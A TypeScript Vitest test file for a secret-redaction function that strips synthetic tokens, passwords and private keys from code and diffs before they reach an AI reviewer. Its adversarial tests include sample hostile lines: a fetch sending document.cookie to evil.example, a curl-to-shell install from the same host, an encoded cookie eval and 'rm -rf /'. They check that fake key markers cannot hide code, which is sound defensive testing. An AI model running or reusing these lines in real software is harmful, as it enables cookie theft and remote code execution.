import { describe, expect, it } from 'vitest';

import {
  AI_PRIVATE_KEY_PLACEHOLDER as KEY,
  AI_SECRET_PLACEHOLDER as S,
  AI_SECRET_PLACEHOLDER,
  redactSecretLines,
  redactSecretsForAi as redact,
  redactSecretsForAi,
} from './ai-redaction';

/**
 * Synthetic credentials, assembled at runtime so no realistic secret literal exists in the
 * repository (secret scanners) — they only need the right shape.
 */
const fake = {
  github: 'gh' + 'p_' + 'Ab1'.repeat(12),
  githubApp: 'gh' + 's_' + 'Cd2'.repeat(12),
  githubFine: 'github' + '_pat_' + 'Ef3_'.repeat(12),
  openai: 's' + 'k-proj-' + 'Gh4'.repeat(10),
  awsId: 'AK' + 'IA' + 'ABCDEFGH23456789',
  awsSecret: 'wJal' + 'rXUtnFEMI/K7MDENG/bPxRfiCY' + 'EXAMPLEKEY',
  stripe: 's' + 'k_live_' + 'Ij5'.repeat(8),
  paddle: 'pdl' + '_live_apikey_' + 'Kl6'.repeat(8),
  slack: 'xo' + 'xb-' + '123456789012-' + 'Mn7'.repeat(8),
  bearer: 'Op8'.repeat(10),
  jwt: 'ey' + 'J' + 'hbGciOiJIUzI1NiJ9' + '.ey' + 'J' + 'zdWIiOiIxMjM0In0' + '.' + 'Qr9'.repeat(10),
  password: 'Synthetic-Pass-2026',
  pemBody: 'MIIEvQIBADANBgkqhkiG9w0BAQEFAASC' + 'BKcwggSjAgEAAoIBAQC7'.repeat(2),
};

describe('redactSecretsForAi — detection', () => {
  it.each([
    ['GitHub classic token', `const token = "${fake.github}";`, `const token = "${S}";`],
    ['GitHub App token in prose', `use ${fake.githubApp} here`, `use ${S} here`],
    ['GitHub fine-grained token', `pat=${fake.githubFine}`, `pat=${S}`],
    [
      'OpenAI-style key',
      `client = OpenAI(api_key="${fake.openai}")`,
      `client = OpenAI(api_key="${S}")`,
    ],
    ['AWS access key id', `aws_access_key_id = ${fake.awsId}`, `aws_access_key_id = ${S}`],
    [
      'AWS secret assignment',
      `aws_secret_access_key = ${fake.awsSecret}`,
      `aws_secret_access_key = ${S}`,
    ],
    ['Stripe key', `stripe.setKey('${fake.stripe}')`, `stripe.setKey('${S}')`],
    ['Paddle key', `PADDLE_API_KEY=${fake.paddle}`, `PADDLE_API_KEY=${S}`],
    ['Slack token', `slack: ${fake.slack}`, `slack: ${S}`],
    ['Authorization header', `Authorization: Bearer ${fake.bearer}`, `Authorization: Bearer ${S}`],
    ['JWT', `const t = '${fake.jwt}'`, `const t = '${S}'`],
    [
      'database URL password',
      `DATABASE_URL=postgres://app:${fake.password}@db.internal:5432/x`,
      `DATABASE_URL=postgres://app:${S}@db.internal:5432/x`,
    ],
    [
      'URL credentials',
      `fetch("https://bot:${fake.password}@example.com/api")`,
      `fetch("https://bot:${S}@example.com/api")`,
    ],
    ['JSON secret field', `{ "client_secret": "${fake.password}" }`, `{ "client_secret": "${S}" }`],
    ['YAML secret field (unquoted)', `  password: ${fake.password}`, `  password: ${S}`],
    ['YAML secret field (quoted)', `webhookSecret: '${fake.password}'`, `webhookSecret: '${S}'`],
    ['env secret', `export DB_PASSWORD=${fake.password}`, `export DB_PASSWORD=${S}`],
    ['TS literal', `const apiKey = "${fake.password}";`, `const apiKey = "${S}";`],
  ])('%s', (_name, input, expected) => {
    expect(redact(input)).toBe(expected);
  });

  it('multiple secrets on one line', () => {
    expect(redact(`creds(${fake.github}, ${fake.awsId}, "${fake.openai}")`)).toBe(
      `creds(${S}, ${S}, "${S}")`,
    );
  });

  it('private key block on one line (escaped newlines) and across lines', () => {
    const oneLine = `"key": "-----BEGIN PRIVATE KEY-----\\n${fake.pemBody}\\n-----END PRIVATE KEY-----"`;
    expect(redact(oneLine)).toBe(`"key": "${KEY}"`);
    const multi = [
      '-----BEGIN RSA PRIVATE KEY-----',
      fake.pemBody,
      fake.pemBody.slice(0, 40),
      '-----END RSA PRIVATE KEY-----',
    ].join('\n');
    expect(redact(multi)).toBe(
      ['-----BEGIN RSA PRIVATE KEY-----', KEY, KEY, '-----END RSA PRIVATE KEY-----'].join('\n'),
    );
  });
});

describe('redactSecretsForAi — leaves ordinary code alone', () => {
  it.each([
    ['UUID', `const id = "3f2c9a1e-7b4d-4c8e-9f10-2a3b4c5d6e7f";`],
    ['commit SHA', `headSha: "9c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d"`],
    ['API paths', `router.get('/api/users/:id', handler); // GET /api/users/{id}`],
    [
      'type annotations',
      `  token: string;\n  password?: string | null;\n  apiKey: z.string().min(8),`,
    ],
    [
      'env references',
      `const secret = process.env.WEBHOOK_SECRET;\nconst token = config.get('jwt.secret');`,
    ],
    [
      'templates',
      'const url = `postgres://${user}:${password}@${host}`;\nAuthorization: `Bearer ${token}`',
    ],
    ['env var names as values', `secretName: "GITHUB_TOKEN",\ntokenEnv: 'OPENAI_API_KEY'`],
    ['placeholders', `apiKey: "<your-api-key>",\npassword: "********",\ntoken: "your-token-here"`],
    ['prose', `password: "Must be at least 8 characters long"`],
    ['tokenizer / max tokens', `tokenizer: "cl100k_base",\nmax_tokens: "4096"`],
    [
      'hashes and integrity',
      `"integrity": "sha512-9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"`,
    ],
    ['short values', `password: "hunter2"`],
    ['public Stripe key', `pk_live_${'Ab1'.repeat(8)}`],
    ['sk- names without digits', `import x from "sk-learn-preprocessing-pipeline-tools";`],
    ['bearer prose', `// Bearer authentication is required here`],
  ])('%s', (_name, input) => {
    expect(redact(input)).toBe(input);
  });

  it('OpenAPI schemas stay intact; only an example secret value is redacted', () => {
    const schema = [
      'paths:',
      '  /api/users:',
      '    get:',
      '      responses:',
      "        '200':",
      '          content:',
      '            application/json:',
      '              schema:',
      '                type: object',
      '                properties:',
      '                  users:',
      '                    type: array',
      '                    items:',
      '                      properties:',
      '                        name: { type: string }',
      '                        displayName: { type: string }',
      '                        accessToken: { type: string }',
      `                      example: { accessToken: "${fake.github}" }`,
    ];
    const out = redact(schema.join('\n')).split('\n');
    expect(out.slice(0, -1)).toEqual(schema.slice(0, -1));
    expect(out.at(-1)).toBe(`                      example: { accessToken: "${S}" }`);
  });
});

describe('redactSecretsForAi — diffs', () => {
  const diff = [
    'diff --git a/src/config.ts b/src/config.ts',
    '@@ -1,6 +1,7 @@ export const config = {',
    `-  githubToken: "${fake.github}",`,
    `+  githubToken: process.env.GITHUB_TOKEN,`,
    `   stripeKey: "${fake.stripe}",`,
    `+  openai: "${fake.openai}", aws: "${fake.awsId}",`,
    '+-----BEGIN PRIVATE KEY-----',
    `+${fake.pemBody}`,
    '+-----END PRIVATE KEY-----',
    '@@ -20,3 +21,3 @@',
    '   users: z.array(User),',
    'diff --git a/src/other.ts b/src/other.ts',
    `+const apiKey = "${fake.password}";`,
  ].join('\n');

  it('redacts added, removed and context lines; keeps markers, headers and line count', () => {
    const out = redact(diff);
    const lines = out.split('\n');
    expect(lines).toHaveLength(diff.split('\n').length);
    expect(lines).toEqual([
      'diff --git a/src/config.ts b/src/config.ts',
      '@@ -1,6 +1,7 @@ export const config = {',
      `-  githubToken: "${S}",`,
      `+  githubToken: process.env.GITHUB_TOKEN,`,
      `   stripeKey: "${S}",`,
      `+  openai: "${S}", aws: "${S}",`,
      '+-----BEGIN PRIVATE KEY-----',
      `+${KEY}`,
      '+-----END PRIVATE KEY-----',
      '@@ -20,3 +21,3 @@',
      '   users: z.array(User),',
      'diff --git a/src/other.ts b/src/other.ts',
      `+const apiKey = "${S}";`,
    ]);
    for (const secret of [
      fake.github,
      fake.stripe,
      fake.openai,
      fake.awsId,
      fake.pemBody,
      fake.password,
    ]) {
      expect(out).not.toContain(secret);
    }
  });

  it('does not mutate its input; is idempotent', () => {
    const input = diff;
    const once = redact(input);
    expect(input).toBe(diff);
    expect(redact(once)).toBe(once);
    expect(redactSecretLines(once.split('\n'))).toEqual(once.split('\n'));
  });

  it('a BEGIN marker without a key body does not swallow following code', () => {
    const lines = [
      '+// see -----BEGIN PRIVATE KEY----- format',
      '+const users = await db.users.findMany();',
    ];
    expect(redactSecretLines(lines)).toEqual(lines);
  });

  it('linear time on adversarial input', () => {
    const started = Date.now();
    for (const input of [
      'a'.repeat(200_000),
      `token=${'a'.repeat(200_000)}`,
      `"password": "${'x'.repeat(200_000)}`,
      `${'Bearer '.repeat(30_000)}`,
      `postgres://${'u'.repeat(50_000)}:${'p'.repeat(50_000)}`,
      `-----BEGIN PRIVATE KEY-----${'A'.repeat(100_000)}`,
      `${'k='.repeat(50_000)}`,
    ]) {
      redact(input);
    }
    expect(Date.now() - started).toBeLessThan(3_000);
  });
});

// ── N-7 / N-21 (final audit) ────────────────────────────────────────────────

describe('N-7: multi-line private keys in every layout reaching the model', () => {
  const BODY = [
    'MIIEowIBAAKCAQEAu1SU1LfVLPHCozMxH2Mo4lgOEePzNm0tRgeLezV6ffAt0gun',
    'VTLw7onLRnrq0/IzW7yWR7QkrmBL7jTKEn5u+qKhbwKfBstIs+bMY2Zkp18gnTxK',
    'LxoS2tFczGkPLPgizskuemMghRniWaoLcyehkd3qqGElvW/VDL5AaWTg0nLVkjRo',
    'AB12cd==',
  ];
  const leaked = (out: string) => BODY.some((b) => out.includes(b));

  it('line-numbered context (`12: …`) and verifier windows (`HEAD   12 | …`)', () => {
    const numbered = [
      '10: const k = load();',
      '11: -----BEGIN RSA PRIVATE KEY-----',
      ...BODY.map((b, i) => `${12 + i}: ${b}`),
      '16: -----END RSA PRIVATE KEY-----',
      '17: export default k;',
    ].join('\n');
    const head = [
      'HEAD      11 | -----BEGIN PRIVATE KEY-----',
      ...BODY.map((b, i) => `HEAD      ${12 + i} | ${b}`),
      'HEAD      16 | -----END PRIVATE KEY-----',
    ].join('\n');
    for (const input of [numbered, head]) {
      const out = redactSecretsForAi(input);
      expect(leaked(out)).toBe(false);
      expect(out.split('\n')).toHaveLength(input.split('\n').length);
      expect(redactSecretsForAi(out)).toBe(out); // idempotent
    }
    const out = redactSecretsForAi(numbered);
    expect(out).toContain('12: [REDACTED_PRIVATE_KEY]');
    expect(out).toContain('17: export default k;'); // code after the key untouched
  });

  it('string-concatenated keys in JS/TS', () => {
    const input = [
      'const key =',
      '  "-----BEGIN PRIVATE KEY-----\\n" +',
      ...BODY.map((b) => `  "${b}\\n" +`),
      '  "-----END PRIVATE KEY-----";',
    ].join('\n');
    const out = redactSecretsForAi(input);
    expect(leaked(out)).toBe(false);
    expect(out).toContain('const key =');
  });

  it('encrypted PEM with headers, PGP blocks with a blank line, unwrapped long bodies', () => {
    const encrypted = [
      '-----BEGIN RSA PRIVATE KEY-----',
      'Proc-Type: 4,ENCRYPTED',
      'DEK-Info: AES-128-CBC,3F17F5316E2BAC89',
      '',
      ...BODY,
      '-----END RSA PRIVATE KEY-----',
    ].join('\n');
    const pgp = [
      '-----BEGIN PGP PRIVATE KEY BLOCK-----',
      '',
      ...BODY,
      '-----END PGP PRIVATE KEY BLOCK-----',
    ].join('\n');
    const unwrapped = `-----BEGIN OPENSSH PRIVATE KEY-----\n${BODY.join('').repeat(3)}\n-----END OPENSSH PRIVATE KEY-----`;
    for (const input of [encrypted, pgp, unwrapped]) {
      expect(leaked(redactSecretsForAi(input))).toBe(false);
    }
    expect(redactSecretsForAi(encrypted)).not.toContain('3F17F5316E2BAC89');
  });

  it('diff-prefixed keys keep their diff markers', () => {
    const diff = [
      '@@ -0,0 +1,6 @@',
      '+-----BEGIN EC PRIVATE KEY-----',
      ...BODY.map((b) => `+${b}`),
      '+-----END EC PRIVATE KEY-----',
    ].join('\n');
    const out = redactSecretsForAi(diff);
    expect(leaked(out)).toBe(false);
    expect(
      out
        .split('\n')
        .slice(1)
        .every((l) => l.startsWith('+')),
    ).toBe(true);
  });

  it('a truncated key (no END) never swallows the code that follows', () => {
    const input = [
      '-----BEGIN PRIVATE KEY-----',
      BODY[0],
      'function main() {',
      '  return run(config);',
      '}',
    ].join('\n');
    const out = redactSecretsForAi(input);
    expect(leaked(out)).toBe(false);
    expect(out).toContain('function main() {');
    expect(out).toContain('  return run(config);');
  });
});

describe('N-21: additional credential formats', () => {
  it.each([
    ['STRIPE_KEY=sk_' + 'live_abcdefghijklmnop1234', 'abcdefghijklmnop1234'],
    ['ENCRYPTION_KEY=Zm9vYmFyYmF6cXV4MTIzNDU2', 'Zm9vYmFyYmF6cXV4MTIzNDU2'],
    ['SECRET_KEY_BASE=9f2c1d0e8b7a6f5e4d3c2b1a', '9f2c1d0e8b7a6f5e4d3c2b1a'],
    ['const signingKey = "k3y-s1gning-material-xyz";', 'k3y-s1gning-material-xyz'],
    ['password: correcthorsebattery', 'correcthorsebattery'],
    ['DB_PASSWORD=hunter2hunter2;', 'hunter2hunter2'],
    ['API_TOKEN      =      abc123def456ghi789', 'abc123def456ghi789'],
    [
      'fetch("https://api.example.com/v1/items?access_token=abc123def456ghi789")',
      'abc123def456ghi789',
    ],
    ['GET /export?format=csv&api_key=AbCdEf1234567890', 'AbCdEf1234567890'],
    ['curl -u deploy:s3cr3tP4ss https://example.com', 's3cr3tP4ss'],
    ['DATABASE_URL=postgres://admin:p@ss@db.internal:5432/app', 'p@ss'],
    ['url: postgres://admin:pa/ss1234@db.internal/app', 'pa/ss1234'],
    [
      'SENTRY_DSN=https://0123456789abcdef0123456789abcdef@o123.ingest.sentry.io/42',
      '0123456789abcdef0123456789abcdef',
    ],
    [
      'token: np' + 'm_abcdefghijklmnopqrstuvwxyz0123456789',
      'np' + 'm_abcdefghijklmnopqrstuvwxyz0123456789',
    ],
    ['remote = glp' + 'at-abcdefghij1234567890', 'glp' + 'at-abcdefghij1234567890'],
    [
      'HF = h' + 'f_abcdefghijklmnopqrstuvwxyz0123456789',
      'h' + 'f_abcdefghijklmnopqrstuvwxyz0123456789',
    ],
    [
      'S' + 'G.abcdefghijklmnopqrst.abcdefghijklmnopqrstuvwxyz0123456789',
      'abcdefghijklmnopqrstuvwxyz0123456789',
    ],
    ['twilio: S' + 'K0123456789abcdef0123456789abcdef', 'S' + 'K0123456789abcdef0123456789abcdef'],
  ])('%s', (input, secret) => {
    const out = redactSecretsForAi(input);
    expect(out).not.toContain(secret);
    expect(out).toContain(AI_SECRET_PLACEHOLDER);
    expect(redactSecretsForAi(out)).toBe(out);
  });

  it.each([
    'const cacheKey = "multi_repo_scan";',
    'const sortKey = "createdAt_desc";',
    'password: string;',
    'bypass: true',
    'type: password',
    'const url = `postgres://${user}:${password}@${host}/db`;',
    'GET /users?page=2&limit=50',
    'const total = a + b; // sum of values',
    'export const PRIMARY_KEY = "id";',
  ])('leaves ordinary code alone: %s', (input) => {
    expect(redactSecretsForAi(input)).toBe(input);
  });

  it('documented limitation: unlabelled high-entropy strings are not detected', () => {
    const input = 'const x = "wJalrXUtnFEMIK7MDENGbPxRfiCYEXAMPLEKEY";';
    expect(redactSecretsForAi(input)).toBe(input);
  });
});

/** Synthetic key material only (never a real key). */
const B64 = (seed: string, n = 64) => seed.repeat(Math.ceil(n / seed.length)).slice(0, n);
const BODY = [
  B64('MIIEvQIBADANBgkqhkiG9w0BAQEFAASC'),
  B64('Qm9keUxpbmVUd28v'),
  B64('VGhpcmRMaW5lKzEy'),
];

describe('F-08: CRLF line endings', () => {
  it('redacts bare assignments that end in \\r\\n and keeps the line endings', () => {
    const text = 'DB_PASSWORD=Sup3rS3cretValue\r\npassword: hunter2abcdef\r\nname: demo\r\n';
    const out = redactSecretsForAi(text);
    expect(out).not.toContain('Sup3rS3cretValue');
    expect(out).not.toContain('hunter2abcdef');
    expect(out).toBe(
      `DB_PASSWORD=${AI_SECRET_PLACEHOLDER}\r\npassword: ${AI_SECRET_PLACEHOLDER}\r\nname: demo\r\n`,
    );
  });

  it.each([
    [
      'PGP',
      '-----BEGIN PGP PRIVATE KEY BLOCK-----',
      ['Version: GnuPG v2', 'Comment: test', ''],
      '-----END PGP PRIVATE KEY BLOCK-----',
    ],
    [
      'encrypted PEM',
      '-----BEGIN RSA PRIVATE KEY-----',
      ['Proc-Type: 4,ENCRYPTED', 'DEK-Info: AES-256-CBC,0123456789ABCDEF0123456789ABCDEF', ''],
      '-----END RSA PRIVATE KEY-----',
    ],
  ])('redacts a CRLF %s block with armor headers', (_name, begin, headers, end) => {
    for (const prefix of ['', '+', '12: ', 'HEAD      12 | ']) {
      const lines = [begin, ...headers, ...BODY, 'Ab12Cd==', end, 'const after = 1;'].map(
        (l) => prefix + l,
      );
      const out = redactSecretsForAi(lines.join('\r\n'));
      for (const body of BODY) expect(out).not.toContain(body);
      expect(out).not.toContain('Ab12Cd==');
      expect(out).not.toContain('0123456789ABCDEF0123456789ABCDEF');
      expect(out.split('\n')).toHaveLength(lines.length);
      expect(out).toContain(`${prefix}const after = 1;`);
      expect(out.split('\r\n')).toHaveLength(lines.length);
    }
  });

  it('handles mixed line endings in one text', () => {
    const out = redactSecretsForAi('API_TOKEN=abc123def456ghi\r\nSECRET_KEY=zzz999yyy888xx\nok=1');
    expect(out).toBe(
      `API_TOKEN=${AI_SECRET_PLACEHOLDER}\r\nSECRET_KEY=${AI_SECRET_PLACEHOLDER}\nok=1`,
    );
  });
});

describe('F-21: credential formats', () => {
  it.each([
    [
      'empty-username URL',
      'REDIS_URL=redis://:S3cretRedisPw@cache.internal:6379/0',
      'S3cretRedisPw',
    ],
    [
      'connection string',
      '"DefaultConnection": "Server=db;User Id=sa;Password=Sup3rSecret!;Encrypt=true"',
      'Sup3rSecret!',
    ],
    [
      'Azure storage',
      'conn = "DefaultEndpointsProtocol=https;AccountName=x;AccountKey=abcDEF123ghiJKL456=="',
      'abcDEF123ghiJKL456==',
    ],
    ['Go short declaration', 'password := "correct-horse-battery9"', 'correct-horse-battery9'],
    ['PHP / Ruby arrow', "'password' => 'correct-horse-battery9',", 'correct-horse-battery9'],
    ['base32 seed', 'totp_secret = "JBSWY3DPEHPK3PXP"', 'JBSWY3DPEHPK3PXP'],
    ['Slack app token', 'token = xapp-1-A0123456789-1234567890123-abcdef', 'xapp-1-A0123456789'],
    [
      'Google OAuth client secret',
      'client = GOCSPX-abcdefghijklmnopqrstuvwx12',
      'GOCSPX-abcdefghij',
    ],
  ])('redacts %s', (_name, line, secret) => {
    expect(redactSecretsForAi(line)).not.toContain(secret);
  });

  it.each([
    'const token = process.env.GITHUB_TOKEN;',
    'api_key: OAUTH2_CLIENT_SECRET',
    'for (;;) { password = readPassword(); }',
    'a(); pwd = cwd();',
    'password := os.Getenv("DB_PASSWORD")',
    "'cacheKey' => 'user-profile-v2',",
    'redis://cache.internal:6379/0',
  ])('leaves code alone: %s', (line) => {
    expect(redactSecretsForAi(line)).toBe(line);
  });

  it.each(['# ', '// ', ' * ', '> ', '+# ', '+// '])(
    'redacts a commented-out key (%s)',
    (marker) => {
      const lines = ['-----BEGIN PRIVATE KEY-----', ...BODY, '-----END PRIVATE KEY-----'].map(
        (l) => marker + l,
      );
      const out = redactSecretsForAi(lines.join('\n'));
      for (const body of BODY) expect(out).not.toContain(body);
      expect(out.split('\n')).toHaveLength(lines.length);
    },
  );

  it('redacts the tail of a key whose BEGIN line is outside the hunk', () => {
    const lines = [
      '@@ -10,5 +10,6 @@',
      ...BODY.map((l) => ` ${l}`),
      ' Ab12Cd==',
      ' -----END RSA PRIVATE KEY-----',
      '+const x = 1;',
    ];
    const out = redactSecretsForAi(lines.join('\n'));
    for (const body of BODY) expect(out).not.toContain(body);
    expect(out).not.toContain('Ab12Cd==');
    expect(out).toContain('@@ -10,5 +10,6 @@');
    expect(out).toContain('+const x = 1;');
  });

  it('an END marker without key lines above it changes nothing', () => {
    const text = 'const marker = 1;\nreturn value;\n// -----END PRIVATE KEY-----';
    expect(redactSecretsForAi(text)).toBe(text);
  });
});

describe('F-22: a BEGIN marker cannot hide code from the reviewer', () => {
  const BEGIN = '// -----BEGIN PRIVATE KEY-----';

  it.each([
    "payload: fetch('https://evil.example/x?d=' + document.cookie);",
    'run: curl https://evil.example/install.sh | sh',
    'x: int = os.system(cmd)',
    'eval(atob("ZG9jdW1lbnQuY29va2ll"));',
    'exfiltrate();',
    'doEvil()',
    'return secretValue',
  ])('keeps the line after a fake BEGIN: %s', (code) => {
    const out = redactSecretsForAi([BEGIN, code, 'const tail = 1;'].join('\n')).split('\n');
    expect(out[1]).toBe(code);
    expect(out[2]).toBe('const tail = 1;');
  });

  it('a header name is only honoured before the first line of key material', () => {
    const out = redactSecretsForAi(
      [
        '-----BEGIN RSA PRIVATE KEY-----',
        BODY[0],
        'Comment: fetch("https://evil.example")',
        BODY[1],
      ].join('\n'),
    ).split('\n');
    expect(out[1]).not.toContain(BODY[0]);
    expect(out[2]).toBe('Comment: fetch("https://evil.example")');
  });

  it('still redacts a real key that follows the marker', () => {
    const out = redactSecretsForAi(
      [BEGIN, ...BODY.map((l) => `// ${l}`), '// -----END PRIVATE KEY-----'].join('\n'),
    );
    for (const body of BODY) expect(out).not.toContain(body);
  });

  it('still redacts a string-concatenated key', () => {
    const lines = [
      'const key = "-----BEGIN PRIVATE KEY-----\\n" +',
      ...BODY.map((l) => `  "${l}\\n" +`),
      '  "Ab12Cd==\\n" +',
      '  "-----END PRIVATE KEY-----";',
    ];
    const out = redactSecretsForAi(lines.join('\n'));
    for (const body of BODY) expect(out).not.toContain(body);
    expect(out).not.toContain('Ab12Cd==');
  });
});

describe('adversarial review: the redactor cannot be turned into a code-hiding tool', () => {
  const LONG_CALL = 'disableSignatureVerificationForAllWebhookRequests();';

  it('a fake END marker does not redact the code above it', () => {
    const text = [LONG_CALL, 'requireAuth=0', '// -----END PRIVATE KEY-----'].join('\n');
    expect(redactSecretsForAi(text)).toBe(text);
  });

  it('a fake BEGIN marker does not redact long call statements or long identifiers', () => {
    const lines = [
      '// -----BEGIN PRIVATE KEY-----',
      LONG_CALL,
      'grantAdministratorRoleToEveryAuthenticatedAccount()',
      'thisIsAVeryLongIdentifierWithoutAnyDigitsInItAtAllHonestly;',
      'const tail = 1;',
    ];
    const out = redactSecretsForAi(lines.join('\n')).split('\n');
    expect(out.slice(1)).toEqual(lines.slice(1));
  });

  it('BEGIN and END string literals on one line do not swallow the statement between them', () => {
    const line =
      'const a = "-----BEGIN PRIVATE KEY-----"; stealCookies(document.cookie); const b = "-----END PRIVATE KEY-----";';
    expect(redactSecretsForAi(line)).toContain('stealCookies(document.cookie);');
  });

  it.each([
    'Comment: fetch("https://evil.example/" + document.cookie);',
    'Version: grantAdmin(user);',
    'Hash: x = y',
    'Charset: `rm -rf /`',
    'Proc-Type: process.exit(1)',
    'DEK-Info: os.system(cmd)',
  ])('a header NAME does not make a statement a header: %s', (statement) => {
    const out = redactSecretsForAi(
      ['-----BEGIN RSA PRIVATE KEY-----', statement, 'x = 1'].join('\n'),
    ).split('\n');
    expect(out[1]).toBe(statement);
    expect(out[2]).toBe('x = 1');
  });

  it('at most a handful of header lines are accepted before key material', () => {
    const headers = Array.from({ length: 30 }, (_, i) => `Comment: note number ${i}`);
    const out = redactSecretsForAi(
      ['-----BEGIN PGP PRIVATE KEY BLOCK-----', ...headers].join('\n'),
    ).split('\n');
    expect(out.filter((l) => l.includes(KEY)).length).toBeLessThanOrEqual(6);
    expect(out.at(-1)).toBe('Comment: note number 29');
  });

  it('real one-line keys (JSON / env with \\n escapes, with armor headers) are still redacted', () => {
    const oneLine = `"private_key": "-----BEGIN PRIVATE KEY-----\\n${BODY[0]}\\n${BODY[1]}\\n-----END PRIVATE KEY-----\\n"`;
    expect(redactSecretsForAi(oneLine)).not.toContain(BODY[0]);
    const encrypted = `KEY="-----BEGIN RSA PRIVATE KEY-----\\nProc-Type: 4,ENCRYPTED\\nDEK-Info: AES-256-CBC,0123ABCD\\n\\n${BODY[0]}\\n-----END RSA PRIVATE KEY-----"`;
    expect(redactSecretsForAi(encrypted)).not.toContain(BODY[0]);
  });
});

describe('adversarial review: keys inside prefixed string literals are still redacted', () => {
  it.each([
    [
      'Python bytes',
      (l: string) => `    b"${l}\\n"`,
      'KEY = (b"-----BEGIN RSA PRIVATE KEY-----\\n"',
      '    b"-----END RSA PRIVATE KEY-----\\n")',
    ],
    [
      'Python f-string',
      (l: string) => `    f"${l}\\n"`,
      'KEY = (f"-----BEGIN RSA PRIVATE KEY-----\\n"',
      '    f"-----END RSA PRIVATE KEY-----\\n")',
    ],
    [
      'raw string',
      (l: string) => `  r"${l}"`,
      'key = r"-----BEGIN PRIVATE KEY-----"',
      '  r"-----END PRIVATE KEY-----"',
    ],
    [
      'C# verbatim',
      (l: string) => `  @"${l}" +`,
      'var key = @"-----BEGIN PRIVATE KEY-----" +',
      '  @"-----END PRIVATE KEY-----";',
    ],
    [
      'append',
      (l: string) => `key += "${l}\\n";`,
      'key = "-----BEGIN PRIVATE KEY-----\\n";',
      'key += "-----END PRIVATE KEY-----\\n";',
    ],
  ])('%s', (_name, wrap, begin, end) => {
    const out = redactSecretsForAi(
      [begin, ...BODY.map(wrap), wrap('Ab12Cd=='), end, 'done()'].join('\n'),
    );
    for (const body of BODY) expect(out).not.toContain(body);
    expect(out).toContain('done()');
  });

  it('the tail look-back still redacts a real key tail (two or more full lines above a lone END)', () => {
    const lines = [
      '@@ -1,4 +1,5 @@',
      ` ${BODY[0]}`,
      ` ${BODY[1]}`,
      ' Ab12Cd==',
      ' -----END RSA PRIVATE KEY-----',
      '+x',
    ];
    const out = redactSecretsForAi(lines.join('\n'));
    expect(out).not.toContain(BODY[0]);
    expect(out).not.toContain(BODY[1]);
  });
});
